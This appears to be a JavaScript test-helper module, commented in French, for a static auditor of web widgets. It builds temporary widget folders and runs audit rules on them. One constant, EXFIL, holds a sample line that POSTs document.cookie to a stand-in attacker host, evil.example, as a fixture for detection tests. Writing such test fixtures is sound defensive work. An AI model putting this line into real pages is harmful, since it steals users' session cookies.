import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { construireContexte } from '../src/contexte/inventaire.js';
import { analyseStatique } from '../src/moteur/statique.js';

/**
 * Ce que les essais de la surface de code partagent (`surface-code-charge`,
 * `surface-references`) : une page minimale, un widget écrit dans un dossier
 * temporaire et audité, un code qui exfiltre.
 */

export const page = (corps, tete = '') => `<!doctype html><html lang="fr"><head><title>t</title>${tete}</head><body>${corps}</body></html>`;

export const EXFIL = 'fetch("https://evil.example/c", { method: "POST", body: document.cookie });\n';
export const trie = (liste) => [...liste].sort();
export const PRECISION_GABARIT = /Précision : dans un `<template>`/;

/**
 * Écrit `fichiers` (nom → contenu) dans un dossier temporaire et rend son chemin ;
 * `dehors` : fichiers écrits à côté, hors du dossier (cibles des liens) ; `liens` :
 * [[nom dans le dossier, cible relative à `dehors`]].
 */
export function ecrire(parent, racine, fichiers, { liens = [], dehors = {} } = {}) {
  fs.mkdirSync(racine, { recursive: true });
  for (const [nom, contenu] of Object.entries(fichiers)) {
    fs.mkdirSync(path.dirname(path.join(racine, nom)), { recursive: true });
    fs.writeFileSync(path.join(racine, nom), contenu);
  }
  for (const [nom, contenu] of Object.entries(dehors)) {
    fs.mkdirSync(path.dirname(path.join(parent, 'dehors', nom)), { recursive: true });
    fs.writeFileSync(path.join(parent, 'dehors', nom), contenu);
  }
  for (const [nom, cible] of liens) {
    fs.mkdirSync(path.dirname(path.join(racine, nom)), { recursive: true });
    fs.symlinkSync(path.join(parent, 'dehors', cible), path.join(racine, nom), fs.statSync(path.join(parent, 'dehors', cible)).isDirectory() ? 'junction' : 'file');
  }
}

/** Écrit un widget dans un dossier temporaire (fixe `widget`), appelle `suite(racine)`, nettoie même en cas d'échec. */
export async function avecWidget(fichiers, options, suite) {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'gwaudit-surface-'));
  const racine = path.join(parent, 'widget');
  try {
    ecrire(parent, racine, fichiers, options);
    return await suite(racine);
  } finally {
    fs.rmSync(parent, { recursive: true, force: true });
  }
}

/**
 * Écrit un widget dans un dossier temporaire (fixe `widget`, pour que le nom du
 * dépôt ne varie pas), audite avec les règles statiques, nettoie même en cas
 * d'échec. `liens` : [[nom dans le widget, cible relative à `dehors`]] ; `dehors` :
 * les fichiers écrits hors du widget, à côté de lui (les cibles des liens) ;
 * `plafonds` : les plafonds de lecture que `construireContexte` accepte.
 */
export async function auditer(fichiers, { liens = [], dehors = {}, plafonds } = {}) {
  return avecWidget(fichiers, { liens, dehors }, async (racine) => {
    const ctx = construireContexte(racine, plafonds);
    const constats = await analyseStatique(ctx, { reseau: false });
    return {
      ctx,
      constats,
      surface: ctx.fichiers.filter((f) => f.executee).map((f) => f.chemin).sort(),
      fichier: (chemin) => ctx.fichiers.find((f) => f.chemin === chemin),
      de: (regle, fichier) => constats.filter((c) => c.regle === regle && (fichier === undefined || c.fichier === fichier)),
    };
  });
}
